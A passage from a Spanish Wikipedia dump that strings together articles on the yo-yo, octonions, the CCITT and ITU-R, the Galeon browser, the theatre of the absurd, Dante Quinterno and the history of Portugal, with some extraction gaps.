Entre los pensadores modernos que han criticado la reencarnación se encuentra René Guenón quien se extiende sobre el concepto en su libro "El error espiritista". Afirma que dicha doctrina es occidental y nada tiene que ver con las doctrinas orientales como la metempsicosis o la transmigración de las almas:

El orientalista hindú Ananda Coomaraswamy, en su libro "El Vedanta y la tradición occidental", afirma:

El mismo Coomaraswamy en "Gradación, evolución y reencarnación:"




</doc>
<doc id="6366" url="https://es.wikipedia.org/wiki?curid=6366" title="Yo-yo">
Yo-yo

El yo-yo es un juguete formado por un disco de madera, de plástico o de otros materiales con una ranura profunda en el centro de todo el borde, alrededor de la cual se enrolla un cordón que, anudado a un dedo, se hace subir y bajar alternativamente. Se maneja el disco mediante sacudidas hacia arriba y hacia abajo.

El "Webster’s collegiate dictionary" afirma que la palabra yo-yo deriva de la palabra "yóyo" en idioma ilocano, del norte de Filipinas. Muchas otras fuentes, incluido "Extraordinary origins of yesterdays things", de Panati, afirman que "yo-yo" era un término tagalo, que significa ‘viene-viene’.

No se conoce el origen del yo-yo. En una copa ateniense del siglo V a.C. aparece un joven que sostiene un objeto esférico que pende de un hilo, en una actitud que recuerda a la del moderno juego del yo-yo, sin que se pueda estar seguro de las características concretas del objeto o su utilidad.
Hacia el siglo XVIII era conocido en la India.

El 20 de noviembre de 1866, James L. Haven y Charles Hettrick, de Cincinnati (Ohio) firmaron la patente estadounidense, la primera otorgada a un filipino, sobre una «construcción mejorada de un juguete, comúnmente llamado "bandelore"».

Sin embargo, el yo-yo permaneció en relativa oscuridad hasta que en 1928 un filipino-estadounidense llamado Pedro Flores abrió la fábrica Yo-yo Manufacturing Company en Santa Bárbara (California).
La empresa comenzó fabricando una docena de modelos del juguete. Pero un año después, en noviembre de 1929, Flores tuvo que abrir dos fábricas más, en Los Ángeles y Hollywood. Ocupaba a 600 trabajadores y producían 300 000 unidades diarias.

En 1930, el estadounidense Donald Duncan compró las fábricas de Flores.

En los años sesenta aparecieron las empresas de juguetes Plastimarx e Impala, que producían este juguete, así como empresas multinacionales, como Flambeau Products Corporation (dueña de la marca Duncan), así como la empresa Jack Russell, que promovía a la empresa Coca-Cola en todo el mundo.

Entre ellos se hallan los presidentes John F. Kennedy, Lyndon B. Johnson y Richard Nixon, quienes se sabía que eran grandes aficionados del pasatiempo, pues a menudo se les veía jugando con el yoyó en la oficina presidencial de la Casa Blanca.

El 12 de abril de 1985, el yoyó viajó al espacio con la tripulación del transbordador Discovery, y años después, en la nave espacial Atlantis.

Anualmente se lleva a cabo una competencia mundial en Orlando (Florida).

Eddy "Fast" (‘rápido’) McDonald posee el título de la persona en el mundo que puede realizar más «lazadas» en una hora" tras haber realizado 8437 lazadas con su yoyó.

Los yoyós pueden dividirse en 3 grupos según su morfología.:

-Con respuesta: Este tipo de yoyós son el mas conocido de todos. Al lanzarlo, vuelve a recogerse y asciende.

-Sin respuesta: Este tipo de yoyós, menos conocidos, no asciende al ser lanzado ya que incorpora un rodamiento y unos paneles de silicona que requieren de un movimiento específico para hacer que ascienda. 

-De cuerda externa: Este tipo de yoyós no va unido a la cuerda. Para efectuar trucos, el usuario ha de conseguir que la cuerda quede enganchada al eje central. Es muy similar al diábolo.

En Argentina, durante los años 1970 se creó un gran furor alrededor del «yoyó» bronco y el yoyó Russell.

En México el primer yo-yo era de madera, de marca Sheiro.

En 1962, la empresa Plastimax (México) lanzó una campaña publicitaria exitosa de difusión del yoyo.

En Ecuador y varios países de Latinoamérica a finales de los años 1980 la empresa Coca-Cola introdujo con éxito el Genuino Yo-yo Russell.

Actualmente existen en México 2 asociaciones de yoyó la Asociación Mexicana del Yo-Yo y la asociación mexicana de trompo y yoyó del caribe.




</doc>
<doc id="6369" url="https://es.wikipedia.org/wiki?curid=6369" title="Octonión">
Octonión

Los octoniones son la extensión no asociativa de los cuaterniones. Fueron descubiertos por John T. Graves en 1843, e independientemente por Arthur Cayley, quien lo publicó por primera vez en 1845. Son llamados, a veces números de Cayley.

Los octoniones forman un álgebra 8-dimensional sobre los números reales y pueden ser comprendidos como un octeto ordenado de números reales. Cada octonión forma una combinación lineal de la base: 1, "e", "e", "e", "e", "e", "e", "e".
La forma de multiplicar octoniones está dada en la tabla siguiente:

Este producto no es conmutativo ni asociativo. A causa de esta no asociatividad, los octoniones, a diferencia de los cuaterniones, no admiten una representación matricial.


</doc>
<doc id="6379" url="https://es.wikipedia.org/wiki?curid=6379" title="Comité Consultivo Internacional Telegráfico y Telefónico">
Comité Consultivo Internacional Telegráfico y Telefónico

CCITT son las siglas de Comité Consultivo Internacional Telegráfico y Telefónico ("Consultative Committee for International Telegraphy and Telephony" (en inglés); "Comité Consultatif International Télégraphique et Téléphonique" (en francés)), antiguo nombre del comité de normalización de las telecomunicaciones dentro de la Unión Internacional de Telecomunicaciones (UIT), ahora conocido como UIT-T (Sector de Normalización de las Telecomunicaciones de la UIT).



</doc>
<doc id="6380" url="https://es.wikipedia.org/wiki?curid=6380" title="Sector de Radiocomunicaciones de la UIT">
Sector de Radiocomunicaciones de la UIT

El Sector de Radiocomunicaciones de la Unión Internacional de Telecomunicaciones (UIT-R), o "Radiocommunication Sector of the International Telecommunication Union (ITU-R)", es la parte del organismo internacional UIT referente a las radiocomunicaciones encargado de:

Los primeros estudios internacionales relacionados con el área de radiocomunicaciones se realizaron tras la primera Conferencia Internacional de Radiotelegrafía de Berlín ("International Radiotelegraph Conference") de 1906, en la que 29 estados marítimos firmaron la Convención Internacional de Radiotelegrafía ("International Radiotelegraph Convention"). En 1927, durante la conferencia de Washington, se creó la precursora de la ITU-R, denominada como Comité Consultivo Internacional de Radiocomunicaciones (CCIR), o "International Radio Consultative Committee (IRCC)", con el objeto de servir como un comité de normalización de las radiocomunicaciones. Unos años después, durante la Conferencia Internacional de Radio de 1947 celebrada en Atlantic city, se creó la Junta Internacional de Registro de Frecuencias, o "International Frequency Registration Board (IFRB)"), con el fin de regular las frecuencias de radiocomunicaciones, que más adelante se fusionaría con la CCIR para formar el actual ITU-R, en 1992 durante la Conferencia Extraordinaria de Plenipotenciarios de Ginebra ("Additional Plenipotentiary Conference").

Presentación de la UIT-R


</doc>
<doc id="6381" url="https://es.wikipedia.org/wiki?curid=6381" title="Galeon">
Galeon

Galeon es un navegador web libre creado para el proyecto GNOME. Galeon está basado en el motor de renderizado Gecko, el mismo que utiliza Mozilla Firefox.

Cuando se creó Galeon, los navegadores web más populares de su momento, Netscape, Mozilla e Internet Explorer eran programas grandes con muchas funciones. Esto hacía que fueran poco prácticos de usar, debido a sus altos consumos de memoria y procesador. Galeon se creó con el objetivo de ser lo más ligero y rápido posible. Galeon introdujo un sistema de marcadores inteligentes, que pueden personalizarse con iconos adicionales y texto, incrustarse en una barra de herramientas y ordenarse dentro de múltiples categorías.

Marco Pesenti Gritti, uno de los programadores originales de Galeon, anunció en 2002 que había comenzado a trabajar en un nuevo navegador para GNOME llamado Epiphany, debido a desacuerdos con el equipo de desarrollo respecto a la audiencia objetivo del navegador. Actualmente GNOME se distribuye con Epiphany como su navegador predeterminado.

Epiphany continuó con el motor de renderizado Gecko durante algún tiempo, hasta que se anunció su cambio al motor WebKit, utilizado, entre otros, por Safari y Google Chrome.




</doc>
<doc id="6385" url="https://es.wikipedia.org/wiki?curid=6385" title="Teatro del absurdo">
Teatro del absurdo

El Teatro del absurdo abarca un conjunto de obras escritas por ciertos dramaturgos estadounidenses y europeos durante las décadas de 1940, 1950 y 1960 y, en general, el que surgió a partir de la obra de aquellos. Se caracteriza por tramas que parecen carecer de significado, diálogos repetitivos y falta de secuencia dramática que a menudo crean una atmósfera onírica. El teatro del absurdo tiene fuertes rasgos existencialistas y cuestiona la sociedad y al hombre. A través del humor y la mitificación escondían una actitud muy exigente hacia su arte. La incoherencia, el disparate y lo ilógico son también rasgos muy representativos de estas obras comunes. 

Muchos ven el Teatro del absurdo como una obra sin explicación lógica y sin sentido. Se resalta la incongruencia entre el pensamiento y los hechos, así como la incoherencia entre las ideologías y los actos. Los personajes tienen un gran obstáculo para expresarse y comunicarse entre ellos mismos constantemente. En las obras, definitivamente el decorado y las escenografías (al igual con los objetos y los accesorios utilizados) juegan un papel muy importante como contraste con el contenido de las mismas, porque presentan imaginariamente la realidad de los mensajes que se pretenden llevar. Se presenta todo en un marco de un mundo vacío y con objetos muy pesados que terminan dominando a los personajes. Toca temas muy importantes, relacionados, por ejemplo, con cuán susceptible se encontraba la civilización después de un gran conflicto bélico como lo fue la Segunda Guerra Mundial. Se percibe a través de sus personajes la desorganización que existía hasta en la manera de comunicarse unos a otros, donde muchas veces no había un punto de acuerdo entre todas las partes, pero si un abuso de poder, donde los ricos y poderosos atropellaban a los más débiles y a los que menos posibilidades tenían para sobrevivir ante tanto caos y confusión. Lo interesante del teatro del absurdo es que no da las respuestas que esperamos, o las que creemos que vamos a esperar, sino que nos deja a nosotros la interpretación y el análisis de cada una de sus obras. El término «absurdo» proviene del uso de la misma palabra por los pensadores existencialistas como Albert Camus y Jean-Paul Sartre.

Sus raíces pueden encontrarse en las obras de «moralidad alegórica» de la Edad Media y en los autos sacramentales (dramas religiosos alegóricos) de la España barroca, en la literatura del "no-sentido" de autores como Lewis Carroll, en las obras de ensueño de Strindberg y las novelas de James Joyce y Franz Kafka, en el drama grotesco de Alfred Jarry; y en las farsas fráticas de Georges Feydeau; obras que tuvieron como continuadores directos al movimiento dadaísta y al surrealismo de los años 1920 y 1930. Una de las fuentes teóricas más potentes del teatro del absurdo fue "El teatro y su doble", obra originalmente publicada en 1938 de Antonin Artaud, creador del estilo del teatro de la crueldad.

El término fue acuñado por Martin Esslin cuando escribió "El teatro del absurdo" (1961). El libro fue llamado «el texto más influyente en el teatro en la década de los 60's» . En la primera edición de su libro, Esslin presentó a los cuatro escritores que definieron el movimiento: Samuel Beckett, Arthur Adamov, Eugène Ionesco, y Jean Genet. En ediciones futuras, agregó a Harold Pinter. Esslin se basó en los ensayos filosóficos de Albert Camus para describir las características del teatro del absurdo.

Surge en el siglo . Los autores comenzaron a aglutinarse bajo la etiqueta de lo absurdo como una forma de acuerdo frente a la ansiedad, lo salvaje y la duda en medio de un universo inexplicable y recayeron en la metáfora poética como un medio de proyectar sus más íntimos estados. Es por ello que las imágenes del teatro absurdo tienden a asumir la calidad de la fantasía, el sueño y la pesadilla, sin interesarle tanto la aparición de la realidad objetiva como la percepción emocional de la realidad interior del autor.

Así, por ejemplo, la obra Días felices de Beckett (1961) expresa una generalizada ansiedad del hombre sobre la aproximación de la muerte, a través de la imagen concreta de una mujer hundida hasta la cintura en el suelo en el primer acto y hasta el cuello en el segundo, mientras que en "El rinoceronte" de Ionesco (1960) se muestra la ansiosa preocupación acerca del esparcimiento de las inhumanas tendencias totalitarias mostrando a la población de una ciudad transformándose en salvajes paquidermos. 

Entre los principales dramaturgos del teatro del absurdo se cuentan René Marques, Fritz Hochwälder, Alfred Jarry, Antonin Artaud, Virgilio Piñera, Eugène Ionesco, Samuel Beckett, Georges Schehadé, Jean Genet, Tom Stoppard, Arthur Adamov, Harold Pinter, Slawomir Mrozek, Mijail Volojov, Miguel Mihura y Fernando Arrabal. Algunas obras representativas son: "Esperando a Godot", de Beckett y "El rinoceronte", de Ionesco, o de este último también "La cantante calva". Fuera del teatro: algunas de las películas de Luis Buñuel podrían catalogarse de absurdistas, si bien la clasificación es discutible.

El ensayo de Martín Esslin publicado en 1961, donde la expresión teatro del absurdo se vuelve célebre, define este tipo de dramaturgia analizándola a la luz de los escritos de Albert Camus, y particularmente del Mito de Sísifo, que se refieren a lo absurdo del ser.
Para Esslin los principales dramaturgos del movimiento son Eugène Ionesco, Samuel Beckett, Jean Genet y Arthur Adamov, aun si cada uno de estos autores tiene preocupaciones y estilos muy personales que sobrepasan el término absurdo.

Geográficamente, el origen del teatro del absurdo está situado en el París vanguardista, en los teatros de bolsillo de la ribera izquierda de Sena y precisamente del Barrio Latino. Sin embargo, entre los representantes de este movimiento que viven en Francia, pocos son franceses.

La literatura del absurdo da muestra de la filosofía del dramaturgo de la cual Beckett es uno de los máximos representantes. Aunque más bien a Beckett se le relaciona con el Teatro del absurdo donde la tragedia y la comedia chocan en una ilustración triste de la condición humana y la absurdidad de la existencia. El dramaturgo del absurdo viene a ser un investigador para el cual el orden, la libertad, la justicia, la "psicología" y el lenguaje no son más que una serie de sucesivas aproximaciones a una realidad ambigua, inasible y decepcionante. El dramaturgo del absurdo desmantelará el viejo universo cartesiano y su manifestación escénica.
Un autor contemporáneo exponente del absurdo es José Sanchís Sinisterra (España).

El teatro del absurdo busca romper con las categorías aristotélicas, por lo que uno de los cambios más importantes se presenta en la acción a través de cuatro elementos diferentes: la transformación repentina del personaje, la intensificación progresiva de la situación inicial, la inversión del principio de causalidad (las causas producen efectos contrarios a los que cabría esperar) y el énfasis rítmico o emocional para crear una impresión de desenlace.

Otra aportación innovadora del teatro del absurdo es la repetición como forma de progresión: su función cambia cada vez que una frase o un sonido se repite ("¡Qué curioso, qué extraño y qué coincidencia!" que repiten los Martin en "La cantante calva").
En cuanto a los personajes, ya no son caracteres: pierden su individualidad y se presentan como un conjunto. El teatro del absurdo es antipsicologista, por lo que no se mantiene la complejidad y riqueza psicológica del teatro anterior. Los personajes de este tipo de teatro no parecen tener una función aparente, aunque, al final, el lector puede observar una evolución del personaje.



</doc>
<doc id="6395" url="https://es.wikipedia.org/wiki?curid=6395" title="Dante Quinterno">
Dante Quinterno

Dante Quinterno (ciudad de Buenos Aires, Argentina, 26 de octubre de 1909 - 14 de mayo de 2003) fue un guionista y dibujante de cómics, empresario editorial y productor agropecuario argentino. Fue el productor y director del primer dibujo animado en colores de Argentina «Upa en apuros» en 1942, quien se hizo célebre por la creación de los personajes Patoruzú, Isidoro Cañones, Patoruzito, Don Fierro y Pepín Cascarón.

Dante Raúl Quinterno, fue hijo de Martín Quinterno y de Laura Raffo. Su abuelo paterno Pedro Quinterno procedía del Piamonte, Italia (en Argentina se dedicaba a la producción agropecuaria, y al cultivo y comercialización de frutales).

En 1924 comenzó a enviar sus dibujos a varios diarios porteños y en 1925 publicó su primera tira, "Panitruco", en "El Suplemento". Más adelante llegaron "Andanzas y desventuras de Manolo Quaranta" (1926); "Don Fermín" (después llamada "Don Fierro", 1926), y "Un porteño optimista" (luego "Las aventuras de Don Gil Contento", 1927), para diferentes diarios. En la última serie mencionada, en 1928, dio a conocer su personaje Curugua-Curuguagüigua, quien luego fue rebautizado como "Patoruzú". Junto con Patoruzú aparecieron otros personajes como Isidoro Cañones y Patoruzito, quienes luego también tuvieron sus propias publicaciones independientes.
Desde 1936, la revista Patoruzú se transformó en una publicación independiente, que en sus mejores momentos llegaría a vender 300 000 ejemplares semanales. Ese mismo año, el autor fundó la Editorial Dante Quinterno S.A. donde comienzan exitosas publicaciones: "Patoruzú" (desde 1936), "Patoruzito" (desde 1945), en el que colaboraron Eduardo Ferro, José Luis Salinas y Alberto Breccia entre otras figuras; "Andanzas de Patoruzú" (desde 1956), "Correrías de Patoruzito" (desde 1958), "Pepín Cascarón" (desde 1960), "Locuras de Isidoro" (desde 1968), "Patoruzito Escolar" (desde 1971) y los recordados «Libros de Oro de Patoruzú» (anuales).

Quinterno fundó también a través de su Editorial la revista «Dinámica Rural» una de las publicaciones más importantes y exitosas de la industria Agrícola-Ganadera para el mercado Argentino.

Durante la década de 1930 Quinterno viajó a los Estados Unidos para estudiar producción de dibujos animados (con los hermanos Max y Dave Fleischer, creadores de Betty Boop y Popeye). Allí tomó contacto también con Walt Disney en sus estudios, donde entablarían una amistad que continuaría a través de los años. Cuando regresa a la Argentina, Quinterno inició también su carrera como animador, y el 20 de noviembre de 1942 estrenó en el cine Ambassador el extraordinario cortometraje de 15 minutos de duración, "Upa en apuros", que fue el primer dibujo animado realizado en colores en Argentina y la región, recibiendo también numerosos reconocimientos de la asociación de cronistas cinematográficos de la Argentina y otras entidades. El proyecto nació como un largometraje, pero la falta de material virgen color ocasionada por la Segunda Guerra Mundial limitó el metraje final. Entre 1941 y 1948 se publicó en forma ininterrumpida la tira del personaje Patoruzú en versión inglés en el diario «PM» de New York (USA), y en 1946 también salió la publicación de la revista titulada; «The adventures of Patoruzú». regresaría al país en 1951, donde permanecería hasta 1955, desde entonces solo viajaría al país esporadicamente.

Como editor, Quinterno fue además uno de los fundadores de la Asociación Argentina de Editores de Revistas.

A lo largo de su vida fue premiado por el Arzobispado de Buenos Aires, la Asociación de Cronistas Cinematográficos de la Argentina, la Cámara de Diputados de la Nación Argentina, Legislatura de la Ciudad de Buenos Aires, y la Asociación Argentina de Editores de Revistas.

A partir de los años 90 se distanció del mundo de la historieta, dedicado a otras actividades empresariales, pero continuando en forma ininterrumpida con la publicación de sus historietas y personajes a través de su Editorial y licenciataria; Editorial Universo S.A. y Los Tehuelches S.A.

Dante Quinterno se casó en 1938 con Rosa Schiaffino, con quien tuvo tres hijos: Dante, Walter y Mónica.

Falleció en Buenos Aires el 14 de mayo de 2003, y fue sepultado en el Cementerio de La Recoleta.

En el año 2009, el Museo del Dibujo y la Ilustración de Buenos Aires, organizó dos muestras: "Patoruzú: una revista, una época" en el Museo de Artes Plásticas Eduardo Sívori y "Revista Patoruzú, una bisagra cultural" en la Feria Internacional del Libro de Buenos Aires, donde se rindió merecido homenaje a las grandes creaciones de Dante Quinterno. Estas muestras fueron adaptadas para realizarlas de modo itinerante por todo el país.



</doc>
<doc id="6396" url="https://es.wikipedia.org/wiki?curid=6396" title="Portugal">
Portugal

Portugal, oficialmente la República Portuguesa (en portugués: "República Portuguesa"; pron. AFI [rɛ'puβlikɐ puɾtu'ɣezɐ] o [ʁɛ'puβlikɐ puɾtu'ɣezɐ]; en mirandés: "República Pertuesa"), es un país soberano miembro de la Unión Europea, constituido como un estado de derecho democrático. Es un país , su territorio, con capital en Lisboa, está situado en el suroeste de Europa, en la península ibérica. Limita al este y al norte con España, y al sur y oeste con el océano Atlántico. Comprende también los archipiélagos autónomos de las Azores y Madeira situados en el hemisferio norte del océano Atlántico.

El nombre de Portugal probablemente provenga del antiguo nombre de Oporto, del latín «Portus-Galliae» —puerto de Galia, debido a que las naves galas frecuentaban este puerto— o, más probablemente, de «Portus-Cale» —topónimo atestiguado en la "Chronica" del historiador del siglo V Hidacio—, por un amarradero existente en un lugar fortificado llamado «Cale».

Portugal ha sido un testigo histórico de un flujo constante de diferentes civilizaciones durante los últimos 3100 años. Tartessos, celtas, fenicios, cartagineses, griegos, romanos, germanos (suevos y visigodos), musulmanes, judíos y otros pueblos han dejado huella en la cultura, historia, lenguaje y etnia. Durante los siglos XV y XVI, Portugal fue una potencia económica, social y cultural mundial, así como un imperio que se extendía desde Brasil hasta las Indias Orientales. Posteriormente, sobre todo tras las Guerras Napoleónicas y la independencia de Brasil entre finales del s. XVIII y principios del s. XIX, Portugal empezó a vivir periodos convulsos. El país vivió bajo una dictadura entre 1933 y 1974, cuando cayó tras una revuelta conocida como la Revolución de los Claveles. En 1986 ingresó en la Unión Europea y, desde 2001, forma parte de la eurozona.

Es un país desarrollado, con un índice de desarrollo humano (IDH) considerado como «muy elevado», y con una alta tasa de alfabetización. El país está clasificado como el 19.º con mejor calidad de vida, tiene uno de los mejores servicios sanitarios del planeta y es considerado una nación globalizada y pacífica. Asimismo, es el 18.º destino turístico mundial en volumen de visitantes. Es miembro de la ONU, la UE (incluyendo la eurozona y el Espacio Schengen), la OTAN, la OCDE y la CPLP, entre otros. También participa en las fuerzas de paz de las Naciones Unidas.

"Cale", la actual ciudad de Vila Nova de Gaia, ya era conocida como "Portucale" desde los tiempos de los Godos y de los Suevos. En el siglo V, durante la invasión de los Suevos, Idácio de Chaves ya escribe sobre un lugar llamado Portucale, a donde huyó Requiario, sin embargo en ese momento no era más que el nombre de una población en las cercanías de Oporto:

No será hasta el siglo IX en que la denominación "portucalense" y derivados comience a ser usada para designar al territorio del actual norte de Portugal desembocando con la creación del Condado Portucalense.

En un escrito del año 841, aparece por primera vez la mención de la provincia «portucalense». Lo firma Alfonso II de Asturias que ampliaba la jurisdicción espiritual del obispo de Lugo y dice:
El Condado Portucalense o condado de Portugal se mantendrá como parte integrante de los reinos de Asturias, Galicia o León hasta que en 1139 Alfonso I de Portugal se proclame rey pasando de condado a Reino de Portugal. En los siglos venideros el reino se expandirá hacia el sur por las tierras de la antigua Lusitania.

No obstante, hay estudiosos que afirman que el nombre «Portugal» proviene de «Portogatelo», nombre dado por un jefe proveniente de Grecia llamado Catelo que desembarcó y se estableció cerca de la actual Oporto. La primera vez que el nombre de Portugal apareció como elemento de raíz heráldica fue en una carta de donación de la iglesia de São Bartolomeu de Campelo por Alfonso I de Portugal en 1129.

La prehistoria de Portugal está unida a la de la península ibérica. Hacia el año 10 000 a. C. los íberos comenzaron a poblar el interior de las tierras de la península a la que darían nombre. Entre el 4000 a. C. y el 2000 a. C., Portugal y Galicia vieron como se desarrollaba una cultura megalítica original, con respecto al resto de la península, caracterizada por su arquitectura funeraria, sus rituales propios y por la práctica de la inhumación colectiva. Aún se pueden encontrar monumentos de entonces, sobre todo en el Alentejo: el crómlech de los Almendros, cerca de Évora, los del valle Maria do Meio o de Portela de Mogos, así como el dolmen de Zambujeiro.

En la Edad del Bronce hubo unos primeros contactos marítimos entre el litoral atlántico y el de las islas británicas, mientras que el sur de la península empezaba sus relaciones comerciales con el Mediterráneo: griegos y fenicios, provenientes del actual Líbano, así como sus descendientes, los cartagineses. Esto trajo consigo la instalación de los primeros puestos comerciales semipermanentes. El motor de este comercio era la riqueza de la península en metales (oro, plata, hierro y estaño) así como el salado de pescado atlántico, que gozaba de gran reputación en el Mediterráneo. Los fenicios fueron, precisamente, los que fundaron Lisboa alrededor del año 1000 a. C. La leyenda dice que fue Ulises quien le dio nombre.
Durante la Edad del Hierro, un pueblo indoeuropeo se estableció por toda la región: los celtas. Estos ocuparon todo el territorio hoy conocido como Portugal, vivieron en pequeños núcleos de población aislados que se encontraban en los puntos altos con casas circulares o castros y practicaron la agricultura y la ganadería. Con su dominio del hierro los trabajos de la tierra fueron más eficaces, las cosechas aumentaron y mejoraron las condiciones de vida y la demografía.
Los cartagineses llegaron a la península ibérica el s. III a. C., atraídos por sus recursos mineros, pesqueros y por la reputación de los guerreros íberos. Ocuparon el sur de Portugal y, aliados con los lusitanos de origen celta, formaron la primera resistencia a la invasión romana de la península. No obstante, tras las guerras púnicas los cartagineses fueron derrotados y los romanos incorporaron la región a su imperio como Lusitania, a partir de 45 a. C. Tras la disolución del imperio romano en el siglo V d. C. Lusitania fue invadida por pueblos como los suevos, los vándalos, los alanos, los burios y los visigodos hasta que, finalmente, fue conquistada por los árabes. En 868, durante la Reconquista, se formó el condado Portucalense, que fue incorporado al Reino de Galicia en 1071.

Mucho antes de que Portugal lograra su independencia hubo algunos intentos para alcanzar una mayor autonomía, e incluso la independencia, por parte de los condes que gobernaban las tierras del condado de Galicia y de Portucale. Con la idea de acabar con este clima independentista de la nobleza local en relación al dominio leonés, el rey Alfonso VI de León entregó el gobierno del condado de Galicia, que en aquel momento incluía las llamadas «tierras de Portucale», al conde Raimundo de Borgoña. Tras muchos fracasos militares de Raimundo contra los árabes, Alfonso VI decidió dar en 1096 al primo de este, el conde Enrique de Borgoña, el gobierno de las tierras más al sur del condado de Galicia fundándose así el condado Portucalense. Con el gobierno del conde Enrique de Borgoña, el condado conoció no solo una política militar más eficaz en la lucha contra los árabes, sino también una política independentista más activa.

Tras su muerte y la llegada al poder de su hijo Alfonso Enríquez, Portugal consiguió la independencia con la firma en 1143 del tratado de Zamora y reconocida por el papa Alejandro III en la bula "Manifestis Probatum" en 1179. Posteriormente, conquistó localidades importantes como Santarém, Lisboa, Palmela y Évora. Una vez acabada la Reconquista portuguesa en 1249, la independencia del nuevo reino fue puesta en entredicho varias veces por el reino de Castilla. En una de estas situaciones de conflicto con el reino de Castilla, el rey Dionisio I de Portugal firmó junto al rey Fernando IV de Castilla (que era representado, al ser menor de edad, por su madre la reina María de Molina) el Tratado de Alcañices, en el cual se estipulaba que Portugal suprimía los tratados acordados en contra del reino de Castilla por el apoyo al infante Juan de Castilla. En este tratado se establecía entre otras cosas la delimitación fronteriza entre los entonces reinos de Portugal y de León, en la que se incluía la cuestionada localidad de Olivenza. La primera fue debida a la crisis sucesoria abierta tras la muerte de Fernando I de Portugal, que acabó con la victoria portuguesa en Aljubarrota en 1385.

Con el final de la guerra, Portugal inició un proceso de exploración y expansión conocido como «Era de los Descubrimientos», cuyas figuras destacadas fueron el infante Enrique el Navegante y el rey Juan II. Tras la conquista de Ceuta en 1415 y el paso del cabo Bojador por Gil Eanes, la exploración de la costa africana continuó hasta que Bartolomé Díaz comprobó en 1488 la comunicación entre los océanos Índico y Atlántico al doblar el cabo de Buena Esperanza. En poco tiempo los portugueses descubrieron rutas y tierras en Norteamérica, Sudamérica y Oriente, en su mayoría durante el reinado de Manuel I, "el Aventurero". La expansión hacia Oriente, sobre todo gracias a las conquistas de Alfonso de Alburquerque, concentró casi todos los esfuerzos de los portugueses, aunque en 1530 Juan III inició la colonización de Brasil. Las riquezas allí encontradas hicieron que los portugueses se centraran en el Nuevo Mundo, con la consiguiente pérdida de otras plazas en el Índico, como Ormuz, frente a otras potencias europeas.

El país tuvo su «siglo de oro» durante esta época. Sin embargo, en la batalla de Alcazarquivir contra Marruecos, en 1578, murieron el joven rey Sebastián y parte de la nobleza portuguesa. Subió al trono el rey cardenal Enrique, que murió dos años después, con lo que se abrió la crisis sucesoria de 1580, que se resolvió con la llamada "unión ibérica" entre Portugal y España, durante la cual los dos reinos tuvieron coronas separadas pero gobernadas por el mismo rey. Felipe II de España fue el primero de tres reyes españoles. Privado de una política exterior independiente y envuelto en una guerra junto con España contra los Países Bajos, el país sufrió grandes reveses en su imperio y perdió el monopolio del comercio en el Índico.
La unión con España acabó el 1 de diciembre de 1640. La nobleza nacional, tras haber vencido a la guardia real en un repentino golpe de Estado, depuso a la duquesa gobernadora y virreina de Portugal Margarita de Saboya y coronó a Juan IV como rey de Portugal. Se inició así la Guerra de Restauración portuguesa, que se prolongó hasta 1668, año en que se firmó el tratado de Lisboa, por el cual el rey español Carlos II reconoció la independencia de Portugal.

El final del siglo XVII y la primera mitad del siglo XVIII fueron testigos del florecimiento de la minería en Brasil: el descubrimiento de oro y piedras preciosas convirtió a la corte de Juan V en una de las más opulentas de Europa. Estas riquezas sirvieron para pagar productos importados, en su mayoría de Inglaterra, ya que no existía industria textil en el reino y las telas eran importadas de las Islas Británicas. El comercio exterior se basaba en la industria del vino y los esfuerzos para invertir la situación con grandes reformas mercantiles del marqués de Pombal, ministro entre 1750 y 1777, impulsaron el desarrollo económico durante el reinado de José I. Fue durante este reinado cuando un terremoto devastó Lisboa y el Algarve, el 1 de noviembre de 1755.
Para no romper la alianza con Inglaterra, Portugal rechazó unirse al bloqueo continental, por lo que fue invadida por los ejércitos napoleónicos en 1807. La corte de la familia real se refugió en Brasil y la capital se trasladó a Río de Janeiro hasta 1821. Ese año, Juan VI, desde 1816 rey del Reino Unido de Portugal, Brasil y Algarve, regresó a Lisboa para jurar la primera constitución portuguesa. Al año siguiente, su hijo Pedro fue proclamado emperador de Brasil y declaró su independencia con respecto a la metrópolis.

Durante el resto del siglo XIX Portugal vivió períodos de enorme perturbación política y social, como la guerra civil y las repetidas revueltas y pronunciamientos militares como la revolución de Septiembre, la de Maria da Fonte, la de Patuleia, etc. Gracias al Acto Adicional a la Carta Constitucional de 1852 fue posible un periodo de paz interna así como el inicio de las políticas de obras públicas lideradas por Fontes Pereira de Melo. A finales del s. XIX las ambiciones coloniales portuguesas chocaron con las inglesas, lo que provocó el ultimátum británico de 1890. La cesión a las exigencias británicas y los crecientes problemas económicos causaron a la monarquía un descrédito creciente, que culminó con los asesinatos de Carlos I y el príncipe heredero Luis Felipe el 1 de febrero de 1908. La monarquía se mantuvo en el poder durante dos años más, encabezada por Manuel II, pero fue abolida el 5 de octubre de 1910, implantándose en su lugar la república.

El rey salió hacia el exilio en Inglaterra tras la instauración de la república. Después de varios años de inestabilidad política, con luchas de trabajadores, tumultos, levantamientos, homicidios políticos y crisis financieras, problemas agravados por la participación portuguesa en la Primera Guerra Mundial, el ejército tomó el poder en 1926. Dos años más tarde, el régimen militar nombró ministro de Finanzas a António de Oliveira Salazar, profesor de la universidad de Coímbra, que en 1932 se convirtió en presidente del consejo de ministros.

Salazar restauró las finanzas e instituyó el Estado Nuevo, régimen autoritario de corporativismo de Estado con un partido único y sindicatos estatales, además de una afinidad fascista bien marcada, al menos hasta 1945, cuando tras la victoria de los Aliados en la Segunda Guerra Mundial, Salazar sufrió presiones para transformar Portugal en una democracia. En 1968, apartado del poder por una enfermedad, fue sucedido por Marcelo Caetano.

El rechazo del régimen a la descolonización de las provincias ultramarinas supuso el inicio de la guerra colonial primero en Angola (1961), y poco después en Guinea-Bisáu (1963) y Mozambique (1964). A pesar de las críticas de algunos de los oficiales del ejército más veteranos, entre los cuales se encontraba el general António de Spinola, el gobierno se mantuvo firme en su decisión de continuar con esta política. Este último publicó un libro, "Portugal y el futuro", en el que afirmaba que la guerra colonial era insostenible, por lo cual fue destituido. Este hecho aumentó el malestar entre los oficiales más jóvenes del ejército, que el 25 de abril de 1974 dieron un golpe de Estado, conocido como la Revolución de los Claveles.

A esta revolución le siguió un periodo de enfrentamientos políticos muy encendidos entre las fuerzas sociales y políticas, llamado Proceso Revolucionario en Curso, que tuvo su punto álgido en el llamado verano caliente de 1975, durante el cual el país estuvo a punto de caer en un nuevo periodo de dictadura, esta vez de orientación comunista. En este periodo, Portugal reconoció la independencia de todas sus antiguas colonias de África.
